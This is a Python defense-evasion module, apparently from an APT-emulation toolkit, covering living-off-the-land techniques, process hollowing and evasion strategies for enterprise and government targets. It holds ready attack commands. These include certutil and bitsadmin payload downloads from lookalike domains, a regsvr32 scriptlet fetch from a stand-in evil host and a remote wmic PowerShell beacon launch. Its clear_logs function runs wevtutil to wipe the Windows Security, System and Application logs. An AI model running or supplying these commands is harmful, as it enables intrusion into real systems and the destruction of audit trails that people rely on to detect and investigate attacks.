"""
Defense Evasion Module - Techniques for bypassing security controls and detection.

This module contains conceptual implementations of common APT defense evasion techniques
including Living Off The Land (LOTL) and process hollowing.
"""

import random
import subprocess
from typing import List, Dict, Any

from .exploit_intel import enrich_with_exploit_intel

class DefenseEvader:
    """Manage defense evasion techniques for bypassing security controls."""
    
    def __init__(self):
        self.lotl_tools = [
            "certutil", "bitsadmin", "wmic", "regsvr32",
            "mshta", "rundll32", "msbuild", "cscript"
        ]
        self.legitimate_processes = [
            "svchost.exe", "explorer.exe", "notepad.exe",
            "winword.exe", "excel.exe", "powershell.exe"
        ]
    
    def generate_lotl_commands(self) -> Dict[str, List[str]]:
        """Generate Living Off The Land commands for various purposes."""
        
        commands = {
            "download": [
                "certutil -urlcache -split -f https://microsofto365[.]com/config.dat %TEMP%\\config.tmp",
                "bitsadmin /transfer WindowsUpdate /priority foreground https://azurestorage[.]net/payload.exe %TEMP%\\update.exe"
            ],
            "execution": [
                "wmic /node:\"192.168.1.100\" process call create \"powershell -ep bypass -file C:\\Windows\\Temp\\beacon.ps1\"",
                "mshta javascript:alert('Update Required');close()",
                "regsvr32 /s /n /u /i:https://evil[.]com/file.sct scrobj.dll"
            ],
            "information_gathering": [
                "systeminfo",
                "net user",
                "net localgroup administrators",
                "whoami /priv"
            ]
        }
        
        search_terms = list(self.lotl_tools) + ["living off the land"]
        return enrich_with_exploit_intel(
            "defense-evasion",
            commands,
            search_terms=search_terms,
            platform="windows",
            include_payloads=True,
        )
    
    def analyze_lotl_detection(self) -> Dict[str, Any]:
        """Analyze LOTL technique detection difficulty."""
        
        techniques = [
            {
                "tool": "certutil",
                "common_use": "Download files",
                "detection_difficulty": "Medium",
                "common_in_apt": ["APT29", "APT41"],
                "defense": "Monitor certutil with unusual parameters"
            },
            {
                "tool": "bitsadmin", 
                "common_use": "File transfer",
                "detection_difficulty": "Medium",
                "common_in_apt": ["APT28", "Lazarus Group"],
                "defense": "Monitor BITS jobs with external URLs"
            },
            {
                "tool": "wmic",
                "common_use": "Remote execution",
                "detection_difficulty": "High",
                "common_in_apt": ["APT32", "APT34"],
                "defense": "Monitor WMI process creation events"
            }
        ]
        
        result = {
            "techniques": techniques,
            "overall_detection_challenge": "High (blends with legitimate admin activity)",
            "recommended_monitoring": ["Process command line logging", "Network connections", "File downloads"]
        }
        search_terms = [tech.get("tool") for tech in techniques]
        return enrich_with_exploit_intel(
            "defense-evasion",
            result,
            search_terms=search_terms,
            platform="windows",
            include_payloads=True,
        )
    
    def process_hollowing_analysis(self) -> Dict[str, Any]:
        """Analyze process hollowing technique."""
        
        analysis = {
            "technique": "Process Hollowing",
            "description": "Create suspended legitimate process and replace its memory with malicious code",
            "common_targets": self.legitimate_processes,
            "detection_indicators": [
                "Suspended processes with unusual memory regions",
                "Processes with mismatched image paths",
                "Anomalous process behavior after resume"
            ],
            "detection_difficulty": "High",
            "common_in_apt": ["APT1", "APT10", "Equation Group"],
            "defense_measures": [
                "Monitor for suspended process creation",
                "Analyze process memory integrity",
                "Use EDR with behavioral analysis"
            ]
        }
        
        return enrich_with_exploit_intel(
            "defense-evasion",
            analysis,
            search_terms=self.legitimate_processes,
            platform="windows",
            include_payloads=True,
        )
    
    def generate_evasion_strategy(self, environment: str = "enterprise") -> Dict[str, Any]:
        """Generate a comprehensive defense evasion strategy."""
        
        strategies = {
            "enterprise": {
                "primary": "LOTL techniques with certutil/bitsadmin",
                "secondary": "Process injection into trusted applications",
                "tertiary": "Timing-based evasion (off-hours activity)"
            },
            "government": {
                "primary": "WMI-based execution and persistence",
                "secondary": "Registry-based configuration storage",
                "tertiary": "Encrypted C2 channels"
            },
            "high_security": {
                "primary": "Memory-only execution",
                "secondary": "Legitimate tool abuse",
                "tertiary": "Supply chain compromise"
            }
        }
        
        strategy = strategies.get(environment, strategies["enterprise"])
        
        result = {
            "environment": environment,
            "strategy": strategy,
            "estimated_success_rate": "60-80% (based on real APT campaigns)",
            "key_considerations": [
                "Avoid signature-based detection",
                "Minimize disk writes",
                "Use encrypted communication",
                "Blend with normal network traffic"
            ]
        }

        return enrich_with_exploit_intel(
            "defense-evasion",
            result,
            search_terms=[environment] + list(strategy.values()),
            platform="windows",
            include_payloads=True,
        )


def analyze_defense_evasion_landscape() -> Dict[str, Any]:
    """Analyze the overall defense evasion landscape."""
    evader = DefenseEvader()
    
    analysis = {
        "lotl_commands": evader.generate_lotl_commands(),
        "lotl_detection": evader.analyze_lotl_detection(),
        "process_hollowing": evader.process_hollowing_analysis(),
        "evasion_strategies": {
            env: evader.generate_evasion_strategy(env) 
            for env in ["enterprise", "government", "high_security"]
        },
        "defense_recommendations": [
            "Implement application whitelisting",
            "Monitor for anomalous LOTL tool usage",
            "Use behavioral analysis EDR solutions",
            "Regular security awareness training"
        ]
    }
    search_terms = ["defense evasion", "lotl", "process hollowing"]
    return enrich_with_exploit_intel(
        "defense-evasion",
        analysis,
        search_terms=search_terms,
        platform="windows",
        include_payloads=True,
    )


def clear_logs() -> Dict[str, Any]:
    """Clears system logs for defense evasion."""
    print("[+] Clearing system logs...")
    
    cleared_logs = []
    log_types = ["Security", "System", "Application"]
    
    for log_type in log_types:
        try:
            subprocess.run(f"wevtutil cl {log_type}", shell=True, check=True, capture_output=True)
            cleared_logs.append(log_type)
        except (subprocess.CalledProcessError, FileNotFoundError):
            pass

    result = {
        "action": "Log Clearing",
        "logs_cleared": cleared_logs,
        "success_rate": f"{len(cleared_logs)}/{len(log_types)}",
        "technique": "Event Log Clearing",
        "detection_difficulty": "Medium",
        "common_in_apt": ["APT29", "APT41", "APT28"]
    }
    
    print(f"[+] Successfully cleared {len(cleared_logs)} out of {len(log_types)} log types")
    
    return enrich_with_exploit_intel(
        "defense-evasion",
        result,
        search_terms=["log clearing", "event logs", "defense evasion"],
        platform="windows",
        include_payloads=True,
    )